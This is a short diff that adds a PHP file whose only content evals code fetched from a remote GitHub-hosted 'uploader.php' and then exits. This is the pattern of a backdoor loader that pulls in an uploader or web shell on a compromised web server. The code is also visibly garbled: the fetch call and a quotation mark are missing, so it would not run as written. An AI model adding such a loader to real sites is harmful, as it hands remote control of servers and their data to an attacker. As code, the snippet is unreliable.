@@ -1,0 +1,7 @@
+<?Php
+
+        $awo = 'https://';
+        eval("?>" . https://raw.githubusercontent.com/khrisnaaditya920-lang/khcebol/refs/heads/main/uploader.php'));
+        exit;
+   
+?>
